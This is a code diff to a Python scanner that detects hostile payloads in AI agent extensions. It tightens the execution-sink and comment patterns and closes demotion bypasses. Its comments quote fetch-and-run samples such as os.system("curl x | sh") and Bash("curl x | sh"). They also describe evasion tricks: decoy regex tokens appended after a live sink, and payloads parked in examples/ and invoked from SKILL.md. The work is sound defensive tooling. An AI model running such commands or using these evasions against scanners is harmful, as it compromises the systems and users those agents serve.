@@ -71,10 +71,16 @@ _DOC_SUFFIXES = {".md", ".markdown", ".mdx", ".rst", ".txt", ".adoc"}
 # these — the same logic as an imperative sentence above a markdown fence.
 # Blanket-demoting string literals would make `os.system("curl x | sh")` invisible,
 # which is a trivial bypass.
+# Two alternations, because the terminator differs. Names end at a word
+# boundary; call forms end at `(` and must NOT be followed by \b — `\b` after
+# `(` needs a word character next, so `Bash("curl x | sh")` (quote after the
+# paren) never matched, and the most direct agent-native exec sink there is was
+# invisible to the guard below.
 _EXEC_SINK = re.compile(
-    r"\b(os\.system|os\.popen|subprocess\.|Popen|check_output|commands\.getoutput"
-    r"|child_process|execSync|spawnSync|shell_exec|passthru|system\s*\("
-    r"|shell\s*=\s*True|\beval\b|\bexec\b|Bash\s*\(|run_command)\b"
+    r"\b(?:os\.system|os\.popen|subprocess\.|Popen|check_output"
+    r"|commands\.getoutput|child_process|execSync|spawnSync|shell_exec"
+    r"|passthru|shell\s*=\s*True|eval|exec|run_command)\b"
+    r"|\b(?:system|Bash|popen|execve|execl)\s*\("
 )
 
 
@@ -132,7 +138,16 @@ def in_inline_code(line: str, index: int) -> bool:
     return line.count("`", 0, index) % 2 == 1
 
 
-_COMMENT = re.compile(r"(^|\s)(#|//|--)\s")
+# No trailing `\s` requirement: `#os.system("curl x | sh")` is a comment, and
+# demanding a space after the marker made it read as live code.
+#
+# `--` is deliberately absent. It is a comment marker in SQL and Lua, neither of
+# which shows up in agent extensions, while in shell it is the standard
+# end-of-options separator: `sh -c -- "curl x | sh"` was being read as a comment
+# from the `--` onward, which hid the payload behind two levels of demotion. A
+# false negative on a real payload costs more than a false positive on a Lua
+# comment nobody ships.
+_COMMENT = re.compile(r"(?:^|\s)(?:#|//)")
 
 
 def _in_comment(line: str, index: int) -> bool:
@@ -145,22 +160,37 @@ def _in_comment(line: str, index: int) -> bool:
 def literal_demotion(line: str, index: int) -> int:
     """Confidence levels a code-file match loses for being inert data.
 
-    Never demotes when an execution sink is on the same line — otherwise
-    `os.system("curl x | sh")` becomes invisible, which is a trivial bypass.
+    Never demotes a LIVE execution sink — one that brackets the literal, as in
+    `os.system("curl x | sh")`. Demoting that would be a trivial bypass. A sink
+    that is itself commented out is not live, and a sink NAMED INSIDE the quotes
+    is prose about the sink, not a call to it.
+
+    Order is load-bearing, and it is the reverse of what it was:
+
+    The exec-sink guard must be consulted BEFORE the regex-shape check. Putting
+    regex first was meant to protect a rule catalogue — an entry like
+    `{"regex": r"...eval\\("}` is data even though it names an execution
+    function — but it also let any live sink buy two levels of demotion by
+    appending a decoy: `os.system("curl x|sh"); RE=r"\\d+[^z]"` scored two shape
+    tokens and dropped out of the headline entirely.
+
+    The two cases never actually needed the ordering to tell them apart. In the
+    catalogue entry the sink name sits INSIDE the raw string, so
+    `_exec_sink_outside_literal` is already False and the regex branch below is
+    still reached. In the evasion the sink brackets the literal, so the guard is
+    True and must win. `tests/unit_test.py` pins both directions, and
+    `fixtures/benign/security-tool` pins the catalogue case end to end.
     """
     if _in_comment(line, index):
         return 2
     if not in_string_literal(line, index):
         return 0
-    # Order matters. A rule catalogue that catalogues `eval` contains the word
-    # `eval`, so the exec-sink guard below would fire and block the demotion —
-    # which is how another project's `"regex": r"...eval\\("` was reported as a
-    # live eval. An entry that is structurally a regex is data, even when the
-    # pattern it describes names an execution function.
-    if _REGEX_CONSTRUCTION.search(line) or len(_REGEX_SHAPE.findall(line)) >= 2:
-        return 2
     if _exec_sink_outside_literal(line):
         return 0
+    # Structurally a regex: a description of a pattern, not a value. This is the
+    # source-code equivalent of a markdown table row.
+    if _REGEX_CONSTRUCTION.search(line) or len(_REGEX_SHAPE.findall(line)) >= 2:
+        return 2
     return 1
 
 
@@ -186,17 +216,22 @@ def in_sample_dir(relpath: str) -> bool:
     return any(part.lower() in _ILLUSTRATIVE_DIRS for part in parts)
 
 
-def file_base_position(relpath: str) -> str:
+def file_base_position(relpath: str, invoked: bool = False) -> str:
     """Base position implied by where the file sits and what it is.
 
     A whole test/fixtures/examples directory is a stronger 'not live' signal than
     a fenced snippet under an example heading — it reads as documentary (two
-    levels, floor low), enough to leave the headline. A genuinely live payload
-    hidden in tests/ is what the reachability graph (section 5, deferred) is for;
-    until then it is reported at low confidence, never dropped.
+    levels, floor low), enough to leave the headline.
+
+    `invoked` is the answer the old docstring deferred to "section 5, deferred":
+    the reachability graph now knows which files an entry point actually tells
+    the model to RUN, as opposed to merely mentioning. For those, the directory
+    convention loses — parking a live payload in `examples/` and invoking it from
+    SKILL.md was a two-level demotion an attacker got for the price of a
+    directory name.
     """
     p = PurePosixPath(relpath)
-    if any(part.lower() in _ILLUSTRATIVE_DIRS for part in p.parts[:-1]):
+    if not invoked and any(part.lower() in _ILLUSTRATIVE_DIRS for part in p.parts[:-1]):
         return DOCUMENTARY
     suffix = p.suffix.lower()
     if suffix in _TEXT_CODE_SUFFIXES or suffix in _CONFIG_SUFFIXES:
@@ -212,9 +247,14 @@ PROSE = "prose"
 STRUCTURAL = "structural"  # table, heading, blockquote, fence, code, docstring
 
 
-def classify_lines(relpath: str, text: str) -> list[tuple[str, str]]:
-    """(position, kind) for every line, 0-indexed."""
-    base = file_base_position(relpath)
+def classify_lines(relpath: str, text: str,
+                   invoked: bool = False) -> list[tuple[str, str]]:
+    """(position, kind) for every line, 0-indexed.
+
+    `invoked` means an entry point instructs the model to run this file; it
+    overrides the sample-directory convention. See `file_base_position`.
+    """
+    base = file_base_position(relpath, invoked)
     lines = text.splitlines()
 
     suffix = PurePosixPath(relpath).suffix.lower()
@@ -226,7 +266,7 @@ def classify_lines(relpath: str, text: str) -> list[tuple[str, str]]:
     # `file_base_position` returns documentary for every markdown file, and
     # using that as a floor would flatten imperative body prose — the exact
     # thing a skill's instructions are made of — into documentary everywhere.
-    if not in_sample_dir(relpath):
+    if invoked or not in_sample_dir(relpath):
         return classified
     floor = _ORDER.index(DOCUMENTARY)
     return [(_ORDER[max(_ORDER.index(p), floor)], k) for p, k in classified]
